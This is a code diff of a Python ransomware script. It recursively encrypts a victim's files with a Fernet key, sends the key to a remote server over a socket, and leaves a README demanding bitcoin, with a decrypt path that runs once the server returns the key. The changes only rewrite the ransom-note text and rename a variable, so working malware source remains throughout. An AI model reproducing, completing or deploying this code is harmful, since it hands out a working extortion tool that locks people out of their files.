@@ -2,15 +2,6 @@ import socket
 import os
 from cryptography.fernet import Fernet
 
-readmebefore = """
-Hey!
-Sorry for bothering you but my bitcoin balance is pretty low :(
-Please feel free to contribute and perhaps I'll unlock your files!
-
-PS: Don't delete or rename this file or else I may not be able to recover anything :(
-"""
-readmeafter = "Thank youuuu :)"
-
 def update_path(operation, path=os.getcwd()):
     dirs = list(filter(os.path.isdir, os.listdir(path)))
     files = list(filter(os.path.isfile, os.listdir(path)))
@@ -20,7 +11,8 @@ def update_path(operation, path=os.getcwd()):
 
         if 'README.txt' in files:
             files.remove('README.txt')
-        
+
+
     for file in files:
         update_file(operation, path+'\\'+file)
 
@@ -29,13 +21,13 @@ def update_path(operation, path=os.getcwd()):
 
 
 def update_file(operation, filename):
-    with open(filename) as f:
+    with open(filename) as f:  			
         file_content = f.read()
-    
-    encrypted = operation(file_content.encode())
+
+    updated = operation(file_content.encode())
 
     with open(filename, 'w') as f:
-        f.write(encrypted.decode())
+        f.write(updated.decode())
 
 
 skt = socket.socket()
@@ -46,19 +38,18 @@ if 'README.txt' not in os.listdir():
     key = Fernet.generate_key()
     fernet = Fernet(key)
     update_path(fernet.encrypt)
-    
+
     skt.send('[KEY]'.encode()+key)
-    
+
     with open('README.txt', 'w') as f:
-        f.write(readmebefore)
+        f.write("Send bitcoins")
 else:
     skt.send('[DECODE]'.encode())
     key = skt.recv(1024)
     fernet = Fernet(key)
     update_path(fernet.decrypt)
-    
+
     with open('README.txt', 'w') as f:
-        f.write(readmeafter)
+        f.write("Thanks for your donation sir")
 
 skt.close()
-
